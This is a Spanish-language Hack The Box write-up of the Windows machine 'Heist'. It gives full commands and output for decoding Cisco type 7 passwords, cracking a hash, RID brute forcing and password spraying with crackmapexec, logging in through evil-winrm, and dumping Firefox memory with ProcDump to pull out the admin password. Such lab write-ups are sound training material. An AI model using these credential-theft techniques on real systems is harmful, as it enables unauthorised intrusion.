---
title: "HTB: Heist Writeup  🪟"
date: 2024-11-08
tags:
  - "#Cisco"
  - "#Router"
  - "#evil-winrm"
  - "#BackUp"
  - "#smb"
  - "#nmap"
  - "#Windows"
description: Heist es una máquina Windows de dificultad fácil que presenta un portal "Issues" accesible desde el servidor web, donde es posible obtener hashes de contraseñas de Cisco. Estos hashes se descifran para obtener las credenciales, que se usan para realizar fuerza bruta de RID y pulverización de contraseñas, logrando así acceso inicial en la máquina. Posteriormente, al observar los procesos en ejecución, se identifica `firefox.exe`, el cual es volcado utilizando `ProcDump`. Finalmente, al analizar el volcado de memoria del proceso Firefox, se revela la contraseña del administrador, permitiendo así la escalada de privilegios y acceso completo al sistema.
---
---
# Heist

Heist es una máquina Windows de dificultad fácil que presenta un portal "Issues" accesible desde el servidor web, donde es posible obtener hashes de contraseñas de Cisco. Estos hashes se descifran para obtener las credenciales, que se usan para realizar fuerza bruta de RID y pulverización de contraseñas, logrando así acceso inicial en la máquina. Posteriormente, al observar los procesos en ejecución, se identifica `firefox.exe`, el cual es volcado utilizando `ProcDump`. Finalmente, al analizar el volcado de memoria del proceso Firefox, se revela la contraseña del administrador, permitiendo así la escalada de privilegios y acceso completo al sistema.

---
<figure>
<img src="/assets/img/Heist/Heist.png" alt="Heist">
<figcaption>Fig 1. Heist - HTB</figcaption>
</figure>
---
# Port Scanning

Comenzamos con un escaneo de puertos utilizando `nmap` para identificar rápidamente servicios expuestos en la máquina objetivo, en este caso `10.10.10.149`. Este escaneo rápido y eficaz es típico en el análisis de máquinas en CTFs.

```zsh
sudo nmap -p- --open -f -Pn -n -sS --min-rate 5000 10.10.10.149 -oG puertos

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:18 -05
Nmap scan report for 10.10.10.149
Host is up (0.11s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
```

Este resultado muestra que los puertos abiertos en el host son **80, 135, 445, 5985** y **49669**. Como exportamos la salida en un formato `grep`-eable (`-oG puertos`), usamos `stdout` para procesar y extraer los puertos:

```zsh
grep 'Ports:' puertos | awk -F 'Ports: ' '{print $2}' | grep -o '[0-9]*' | paste -sd ','

80,135,445,5985,49669
```

### Desglose del Comando

1. **`grep 'Ports:' puertos`**: Filtra líneas que contienen "Ports:", donde se listan los puertos abiertos.
2. **`awk -F 'Ports: ' '{print $2}'`**: Extrae solo el texto después de "Ports: ".
3. **`grep -o '[0-9]*'`**: Extrae solo los números (puertos) de la línea.
4. **`paste -sd ','`**: Junta todos los números de puerto en una sola línea, separados por comas.

### Escaneo de Versiones de Servicios

Ahora, usando los puertos abiertos obtenidos, hacemos un escaneo para detectar las versiones de los servicios y ejecutamos algunos scripts de Nmap para identificar posibles vulnerabilidades o configuraciones incorrectas:

```zsh
sudo nmap -p80,135,445,5985,49669 -sS -sCV -f -Pn -n 10.10.10.149 -oN objetivos.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:31 -05
Nmap scan report for 10.10.10.149
Host is up (0.12s latency).
PORT      STATE    SERVICE       VERSION
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open     msrpc         Microsoft Windows RPC
445/tcp   open     microsoft-ds?
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open     msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-11-08T14:32:08
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.05 seconds
```

Este escaneo nos da información detallada de los servicios y posibles puntos de entrada para nuestra explotación. La información obtenida aquí es clave para los siguientes pasos en nuestro análisis y explotación de la máquina.
# FootPrinting

## Host Based Enumeration

### WEB

Es hora de realizar una enumeración manual de los servicios que nuestro host está ofreciendo. Comenzaremos con el puerto 80, ya que está ejecutando un servidor web con **Microsoft IIS**. El objetivo es ver si podemos encontrar credenciales o información que nos permita establecer una conexión remota a través del puerto 5985, que también está abierto en el host, como descubrimos durante nuestro escaneo con Nmap.

Al acceder a `http://10.10.10.149` en el puerto 80, nos redirige a `http://10.10.10.149/login.php`. El título HTTP de la página es **"Support Login Page"**, lo cual ya habíamos identificado previamente en el escaneo de Nmap. La página requiere que iniciemos sesión con un usuario válido, pero también es posible que podamos acceder como usuario invitado si no contamos con credenciales específicas.

<figure>
<img src="/assets/img/Heist/Imagen1.png" >
</figure>

Cuando ingresamos a dicha pestaña llamada ***'Recent Issues'***, se puede observar que hace unos 20 minutos el usuario hazard tiene problemas con su router de cisco, además agrega un archivo con la configuración del router, también sabemos que no tiene un usuario en el servidor Windows 

<figure>
<img src="/assets/img/Heist/Imagen2.png" >
</figure>

Cuando leemos la configuracion del router nos encontramos con informacion relevante 
```text
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```
### Cisco Router Configuration

| **Comando**                              | **Descripción**                                                                                                                                       |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `version 12.2`                           | Establece la versión del sistema operativo **Cisco IOS** en el dispositivo (**12.2**).                                                                |
| `no service pad`                         | Desactiva el servicio **Packet Assembler/Disassembler (PAD)**.                                                                                        |
| `service password-encryption`            | Habilita el cifrado de contraseñas en el archivo de configuración.                                                                                    |
| `hostname ios-1`                         | Establece el nombre del dispositivo como **ios-1**.                                                                                                   |
| `security passwords min-length 12`       | Exige que las contraseñas tengan al menos **12 caracteres**.                                                                                          |
| `enable secret 5`                        | Configura la contraseña de habilitación **enable secret**, cifrada con el algoritmo **MD5**.                                                          |
| `username rout3r password 7`             | Crea un usuario llamado **rout3r** con una contraseña cifrada tipo 7.                                                                                 |
| `username admin privilege 15 password 7` | Crea un usuario **admin** con privilegios **15** y una contraseña cifrada tipo 7.                                                                     |
| `ip ssh authentication-retries 5`        | Configura el número máximo de intentos fallidos de autenticación para SSH en **5**.                                                                   |
| `ip ssh version 2`                       | Fuerza el uso de **SSH versión 2**, más seguro que la versión 1.                                                                                      |
| `router bgp 100`                         | Configura el protocolo **BGP (Border Gateway Protocol)** con el **AS número 100**.                                                                    |
| `synchronization bgp`                    | Habilita la **sincronización BGP**, asegurando que las rutas BGP no sean anunciadas hasta que las rutas locales estén sincronizadas.                  |
| `bgp log-neighbor-changes`               | Activa el registro de cambios en los vecinos BGP.                                                                                                     |
| `bgp dampening`                          | Habilita el **damping BGP**, que reduce las fluctuaciones de las rutas BGP.                                                                           |
| `network 192.168.0.0 mask 300.255.255.0` | Anuncia la red **192.168.0.0/24** a través de BGP, pero la máscara es inválida (debe corregirse).                                                     |
| `ip classless`                           | Habilita el enrutamiento sin clases, permitiendo el enrutamiento de IPs no directamente conectadas.                                                   |
| `ip route 0.0.0.0 0.0.0.0 192.168.0.1`   | Configura una **ruta por defecto** para todos los paquetes no coincidentes con otras rutas.                                                           |
| `access-list 101 permit ip any any`      | Crea una **ACL** que permite cualquier paquete IP entre cualquier origen y destino.                                                                   |
| `dialer-list 1 protocol ip list 101`     | Crea una lista de marcadores que utiliza la ACL **101** para permitir tráfico IP.                                                                     |
| `no ip http server`                      | Desactiva el servidor **HTTP** en el dispositivo.                                                                                                     |
| `no ip http secure-server`               | Desactiva el servidor **HTTPS** en el dispositivo.                                                                                                    |
| `line vty 0 4 `                          | Configura las líneas **VTY** para aceptar solo conexiones SSH y establece un tiempo de espera de **600 segundos** para cerrar las sesiones inactivas. |

Podemos utilizar el siguiente enlace para descifrar contraseñas tipo 7 de Cisco: [Tipo 7 Cisco](https://www.networkers-online.com/tools/cisco-type7-password-decrypt/). Las contraseñas tipo 7 están cifradas mediante un algoritmo muy débil, lo que permite que sean fácilmente descifradas con herramientas específicas, como el servicio proporcionado en el enlace. Esto nos permitiría obtener acceso al router, por ejemplo, a través de SSH, y realizar diversas acciones, como configuraciones o pruebas de seguridad.

***Para el Usuario rout3r***

<figure>
<img src="/assets/img/Heist/Imagen3.png" >
</figure>

***Para el Usuario admin***
<figure>
<img src="/assets/img/Heist/Imagen4.png" >
</figure>

En cambio, las contraseñas tipo 5 (también conocidas como contraseñas **MD5**) son mucho más seguras que las tipo 7. Para descifrar contraseñas **MD5**, podemos utilizar herramientas más avanzadas, como **John the Ripper** o **Hashcat**, que están diseñadas para realizar ataques de fuerza bruta y diccionario, y son capaces de descifrar este tipo de hash más robusto.

```zsh
cat hash                                                              
$1$pdQG$o8nrSzsGXeaduXrjlvKc91

john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:00:13 DONE (2024-11-08 10:25) 0.07668g/s 268858p/s 268858c/s 268858C/s stealthy001..stcroix85
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

La contraseña proporcionada con la directiva `enable secret` está destinada a proteger el **modo EXEC privilegiado** en dispositivos de red como los enrutadores y switches de Cisco. Esto significa que si tienes configurada esta contraseña, necesitarás ingresarla para acceder al modo EXEC privilegiado.
### SMB: Enumeración de Usuarios

En este punto, ya contamos con las credenciales del usuario **hazard**, pero no podemos acceder a través del puerto 5985. En lugar de eso, vamos a aprovechar los recursos compartidos de red para obtener una lista de usuarios legítimos. Ya que tenemos contraseñas válidas, utilizamos `crackmapexec` para hacer esto de manera eficiente.

#### Paso 1: Realizar Brute Force de RIDs

El siguiente comando utiliza `crackmapexec` para realizar un ataque de **Brute Force** sobre los **RIDs** del host. Esto nos permitirá enumerar los usuarios legítimos del dominio:

```zsh
crackmapexec smb 10.10.10.149 -u 'hazard' -p 'stealth1agent' --rid-brute
```

Esto devuelve una salida como la siguiente, donde podemos ver los usuarios encontrados:

```
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
```

#### Paso 2: Filtrar y Guardar los Usuarios

Queremos almacenar estos usuarios en un archivo, pero no hacerlo manualmente. Para automatizarlo, utilizamos el concepto de [controlar la salida de stdout](https://7heansw3r.github.io/Contral-Total-STDOUT/) de manera eficiente. Usamos el siguiente comando para filtrar y guardar solo los usuarios (eliminando el tipo de SID):

```zsh
crackmapexec smb 10.10.10.149 -u 'hazard' -p 'stealth1agent' --rid-brute 2>/dev/null | awk -F '\\' '{print $2}' | grep 'SidTypeUser' | sed 's/ (SidTypeUser)//' > Users.txt
```

#### Explicación del Comando:

- **`crackmapexec smb 10.10.10.149 -u 'hazard' -p 'stealth1agent' --rid-brute`**: Realiza el brute force de los RIDs en el host.
- **`2>/dev/null`**: Filtra los errores y muestra solo la salida relevante.
- **`awk -F '\\' '{print $2}'`**: Extrae el nombre de usuario, que es la segunda parte de la línea, separada por la barra invertida (`\`).
- **`grep 'SidTypeUser'`**: Filtra solo las líneas que contienen usuarios (`SidTypeUser`).
- **`sed 's/ (SidTypeUser)//'`**: Elimina la cadena `(SidTypeUser)` al final de cada línea.
- **`> Users.txt`**: Redirige la salida a un archivo llamado `Users.txt`.

#### Resultado:

El archivo `Users.txt` contendrá solo los nombres de los usuarios, sin la información adicional, de forma clara y ordenada:

```plaintext
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
Hazard
support
Chase
Jason
```

Este enfoque permite automatizar el proceso de enumeración de usuarios y guardarlos en un archivo sin tener que hacer todo el trabajo manualmente. Además, te asegura que solo se extraen los nombres de usuario sin el resto de la información innecesaria.


En este punto, ya contamos con una lista de **usuarios legítimos** y **contraseñas válidas**. Ahora vamos a utilizar `crackmapexec` para realizar la autenticación de los usuarios y comprobar cuáles tienen acceso válido, permitiéndonos ejecutar comandos de forma remota.

Utilizamos el siguiente comando para intentar la autenticación con los usuarios y contraseñas listados en los archivos `Users.txt` y `Passwords.txt`. Si las credenciales son correctas, podremos obtener acceso remoto:

```zsh
crackmapexec smb 10.10.10.149 -u Users.txt -p Passwords.txt --continue-on-success 2>/dev/null
```

***Explicación del Comando:*** 

- **`crackmapexec smb 10.10.10.149`**: Especifica el host objetivo y el servicio SMB que se está atacando.
- **`-u Users.txt -p Passwords.txt`**: Carga los archivos de usuarios y contraseñas a través de los parámetros `-u` y `-p`, respectivamente.
- **`--continue-on-success`**: Continúa ejecutando incluso si se encuentran credenciales válidas, permitiendo que se prueben todas las combinaciones.
- **`2>/dev/null`**: Redirige los errores a un archivo nulo para evitar que se muestren en la salida.


El comando generará una salida similar a la siguiente, donde vemos intentos de acceso con diferentes combinaciones de usuarios y contraseñas:

```zsh
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Administrator:stealth1agent STATUS_LOGON_FAILURE
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Guest:stealth1agent STATUS_LOGON_FAILURE
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Jason:stealth1agent STATUS_LOGON_FAILURE
```

En la salida, podemos ver que **Chase** tiene credenciales válidas con la combinación **`Q4)sJu\Y8qz*A3?d`**, que corresponde a la contraseña asociada a ese usuario:

```
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d
```

Ahora verificamos que el usuario tenga ejecución remota de comandos igualmente con `crackmapexec` y pues si tiene ejecución remota de comandos 

```zsh
crackmapexec winrm 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d' 2>/dev/null 
SMB         10.10.10.149    5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
HTTP        10.10.10.149    5985   SUPPORTDESK      [*] http://10.10.10.149:5985/wsman
WINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
```

# Ejecución Remota de Comandos (RCE)

Utilizamos `evil-winrm` para iniciar una sesión remota y obtener la primera bandera:

```zsh
evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
```

En el escritorio del usuario `Chase`, encontramos un archivo `todo.txt` que contiene algunas tareas pendientes:

```zsh
*Evil-WinRM* PS C:\Users\Chase\Desktop> dir
    Directory: C:\Users\Chase\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ -----
-a----        4/22/2019   9:08 AM            121 todo.txt
-ar---        11/8/2024   7:46 PM             34 user.txt

*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

Gracias a un error de configuración, tenemos acceso con el usuario `Chase`, aunque nuestros privilegios son limitados. A continuación, revisamos los privilegios de usuario:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> whoami /all
USER INFORMATION
----------------
User Name                SID
=================        ==============================================
supportdesk\chase        S-1-5-21-4254423774-1266059056-3197185112-1012

GROUP INFORMATION
-----------------
Group Name                             Type            SID          Attributes
======================================= =============== =========== ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias           S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias           S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Observamos la configuración de red del sistema:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0 2:
   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1a3
   Link-local IPv6 Address . . . . . : fe80::250f:fba2:58c9:dc22%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

Intentamos ejecutar el comando `systeminfo`, pero no tenemos los permisos necesarios:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> systeminfo
systeminfo.exe : ERROR: Access denied
```

Enumeramos los procesos en ejecución y notamos que hay varias instancias de `Firefox`:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    466      18     2300       5428               368   0 csrss
    290      13     1960       5044               480   1 csrss
    357      15     3496      14548              5012   1 ctfmon
    254      14     3924      13348              3876   0 dllhost
    166       9     1888       9716       0.02   6772   1 dllhost
    617      32    30296      57776               968   1 dwm
   1489      58    23732      78908              3520   1 explorer
    355      25    16484      38984       0.27   6104   1 firefox
   1071      70   148532     225208       3.73   6440   1 firefox
    347      19    10284      35620       0.06   6552   1 firefox
    401      34    32076      92576       0.41   6724   1 firefox
    378      28    22560      59344       0.22   7012   1 firefox
```

Dado que `Firefox` está en ejecución, podríamos considerar usar `procdump` para extraer la memoria del proceso y analizarla en busca de credenciales.

`ProcDump` es una herramienta de Sysinternals (parte de Microsoft) utilizada principalmente para capturar *volcados de memoria* o *dumps* de un proceso en Windows. Esto es especialmente útil para analizar aplicaciones que presentan problemas de rendimiento, fallos o para investigaciones de seguridad. 

En el contexto de hacking o pentesting, `ProcDump` puede usarse para capturar la memoria de un proceso en busca de información sensible, como credenciales o tokens de autenticación que podrían estar almacenados temporalmente en la memoria. Al analizar un dump, se pueden extraer estos datos si no están cifrados o protegidos de otra manera.

### Principales usos de `ProcDump`:

1. **Capturar errores o fallos**: Permite generar volcados en caso de que un proceso esté fallando o presentando problemas de estabilidad.
2. **Análisis de rendimiento**: Se puede usar para monitorear y capturar información de procesos que consumen altos recursos o muestran problemas de rendimiento.
3. **Investigación forense**: En pentesting, analizar la memoria del proceso puede revelar datos sensibles, como contraseñas en texto plano o configuraciones importantes.

### Ejemplo de uso

Para capturar un dump de un proceso específico (como `firefox.exe`), se puede ejecutar:

```shell
procdump.exe -ma <PID> <ruta de guardado del archivo.dmp>
```

Donde:
- `-ma` indica que se capture todo el espacio de memoria del proceso.
- `<PID>` es el ID del proceso que se quiere analizar.
- `<ruta de guardado del archivo.dmp>` es donde se guardará el dump para su análisis.

# Escalada de Privilegios con `ProcDump`

Para extraer las credenciales del proceso, primero necesitamos `ProcDump`, una herramienta de Sysinternals de Microsoft utilizada para capturar volcados de memoria (*dumps*). En este caso, descargaremos `ProcDump` desde el sitio oficial de Sysinternals.

**Descarga `ProcDump`**  
   Dirígete a [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) y descarga el archivo ZIP que contiene la herramienta.

**Listar el Contenido del ZIP**  
   Utilizamos `7z` para listar los archivos en el ZIP descargado:

   ```zsh
   7z l Procdump.zip
   ```

   El comando listará los archivos contenidos en el ZIP, que deberían incluir:
   - `procdump.exe`
   - `procdump64.exe`
   - `procdump64a.exe`

   Optaremos por `procdump64.exe`, ya que es compatible con el sistema operativo de la máquina víctima.

**Subir `ProcDump` a la Máquina Víctima**  
   Utilizamos `evil-winrm` para cargar `procdump64.exe` en el escritorio del usuario objetivo, `Chase`.

   ```powershell
   *Evil-WinRM* PS C:\Users\Chase\Desktop> upload procdump64.exe
   ```

**Aceptar la Licencia de `ProcDump`**  
   Es necesario aceptar la licencia de `ProcDump` antes de utilizarlo. Ejecutamos:

   ```powershell
   *Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump64.exe -accepteula
   ```

**Identificar el Proceso Objetivo**  
   Utilizamos el comando `Get-Process` para listar los procesos en ejecución y localizar el proceso `firefox`, el cual contiene las credenciales deseadas.

   ```powershell
   *Evil-WinRM* PS C:\Users\Chase\Desktop> get-process -name firefox
   ```

   Esto nos mostrará el `ID` del proceso (PID), necesario para generar el volcado de memoria. Ejemplo de salida:

   ```plaintext
   Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
   -------  ------    -----      -----     ------     --  -- -----------
      355      25    16484      38984       0.27   6104   1 firefox
   ```

**Generar el Volcado de Memoria**  
   Ejecutamos `ProcDump` usando el PID correspondiente (ej., 6104) para crear el volcado de memoria:

   ```powershell
   *Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump64.exe -ma 6104 firefox.dmp
   ```

   Esto creará un archivo `firefox.dmp` en el escritorio del usuario `Chase`.

**Descargar el Archivo de Volcado**  
   Ahora descargamos `firefox.dmp` para analizarlo en nuestro sistema local:

   ```powershell
   *Evil-WinRM* PS C:\Users\Chase\Desktop> download firefox.dmp
   ```

**Analizar el Volcado de Memoria**  
   En nuestro host local, utilizamos `strings` para buscar cualquier referencia a "password" en el volcado:

   ```zsh
   strings firefox.dmp | grep password
   ```

   Este análisis revela posibles credenciales en texto plano en URLs, variables o configuraciones de la memoria, como por ejemplo:

   ```plaintext
   login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ
   ```

**Verificar Credenciales con `crackmapexec`**  
   Ahora, utilizamos `crackmapexec` para probar las credenciales extraídas contra el servicio WinRM:

   ```zsh
   crackmapexec winrm 10.10.10.149 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
   ```

   Si las credenciales son correctas, `crackmapexec` confirmará el acceso (¡pwn3d!).

**Acceder como Administrador**  
   Finalmente, usamos `evil-winrm` para conectarnos como `Administrator` y obtener acceso al sistema con privilegios elevados:

   ```powershell
   evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
   ```

   Al estar en el sistema, podemos buscar y capturar archivos adicionales, como `root.txt` para finalizar la escalada de privilegios.

<div style="width:100%;height:0;padding-bottom:60%;position:relative;"><iframe src="https://giphy.com/embed/BemKqR9RDK4V2" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/japan-jet-alt-BemKqR9RDK4V2">via GIPHY</a></p>
